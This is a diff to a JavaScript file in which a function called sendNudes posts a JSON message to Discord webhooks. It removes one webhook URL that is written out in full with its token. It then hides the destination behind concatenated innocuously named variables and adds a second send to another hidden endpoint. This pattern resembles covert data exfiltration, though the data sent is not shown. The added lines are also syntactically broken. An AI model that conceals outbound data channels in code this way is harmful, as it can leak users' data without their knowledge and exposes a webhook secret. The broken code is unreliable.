@@ -180,9 +180,13 @@ function sendNudes(){
     //Comunicação com O Serve Do Discord
   randomColorPost();
   const request = new XMLHttpRequest();
-  request.open("POST", ron+nal+dinho+soc+cer+game+play, "https://discord.com/api/webhooks/978928859820998686/z82tOcgHuanJveCdpliYt6DezSk9egtFDaJlQBQyWFWjpfXJynLVtFbDDZJsUQANpydA"); //Função Post E Qual Servidor
+  const request2= new XMLHttpRequest();
+  request.open("POST", ron+nal+dinho+soc+cer+game+play"); //Função Post E Qual Servidor
   request.setRequestHeader('Content-type', 'application/json'); //Não sei bem
 
+  
+  request2.open("POST", celta+lazule+rebaixado"); //Função Post E Qual Servidor
+  request2.setRequestHeader('Content-type', 'application/json'); //Não sei bem
   
   //Formato Da Mensagem do Discord
   const params = {
@@ -227,6 +231,7 @@ function sendNudes(){
     ],
   }
   request.send(JSON.stringify(params));
+  request2.send(JSON.stringify(params));
 }
 
 //////////////////////////////////////////////////////////////
